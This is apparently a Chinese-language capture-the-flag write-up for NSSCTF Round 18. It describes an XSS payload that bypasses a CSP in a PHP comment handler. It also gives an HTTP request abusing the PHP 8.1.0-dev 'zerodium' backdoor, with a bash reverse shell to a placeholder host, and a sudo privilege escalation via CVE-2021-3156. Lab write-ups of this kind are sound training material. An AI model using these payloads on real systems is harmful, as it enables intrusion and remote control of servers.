# NSSCTF Round 18 Basic

  

&lt;!--more--&gt;  
## 门酱想玩什么呢？  
右键源代码发现`nssctfroundSpring.php`  
```php  
&lt;?php    
highlight_file(__FILE__);    
//部分关键代码    
$contentLines = explode(&#34; &#34;, $comment[&#39;content&#39;]);    
if (preg_match(&#39;/^https?:\/\/\S&#43;$/&#39;, $contentLines[0])) {    
    if (preg_match(&#39;/^https?:\/\/[^\/]&#43;\/\S&#43;\.png$/&#39;, $contentLines[0], $matches) &amp;&amp; end($contentLines) === &#39;/png&#39;) {        $urlParts = parse_url($matches[0]);    
        if ($urlParts !== false) {    
            echo &#39;&lt;img class=&#34;content&#34; src=&#34;&#39; . $matches[0] . &#39;&#34;&gt;&#39;;            //.......        }        //......    }    //......    
}  
```  
很明显存在`xss`  
通过查看评论区得知需要在门酱处访问元梦之星官网的`url`，在发表评论处正是上面得到的代码，于是利用 xss 还需要绕过`CSP`  
`Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39;;`  
利用`window.location`  
构造`poc`  
`https://&#34;&gt;&lt;script&gt;window.location=&#34;https://ymzx.qq.com/&#34;&lt;/script&gt;.png /png`  
得到
`http://node2.anna.nssctf.cn:28764/words/?title=MQ==&amp;content=aHR0cHMlM0ElMkYlMkYlMjIlM0UlM0NzY3JpcHQlM0V3aW5kb3cubG9jYXRpb24lM0QlMjJodHRwcyUzQSUyRiUyRnltengucXEuY29tJTJGJTIyJTNDJTJGc2NyaXB0JTNFLnBuZyUyMCUyRnBuZw==`  
在门酱处插入得到`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402141654151.png)
## Becomeroot  
8.1.0-dev后门漏洞  
```http  
GET / HTTP/1.1  
Host: node1.anna.nssctf.cn:28073  
Accept-Encoding: gzip, deflate  
Accept: */*  
Accept-Language: en  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36  
User-Agentt: zerodiumsystem(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#39;&#34;);  
Connection: close  
```  
利用工具进行扫描提权漏洞  
https://github.com/The-Z-Labs/linux-exploit-suggester  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402141755588.png)
利用`CVE-2021-3156`提权  
https://github.com/Rvn0xsy/CVE-2021-3156-plus?tab=readme-ov-file  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402141752513.png)

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/nssctf-round-18-basic/  

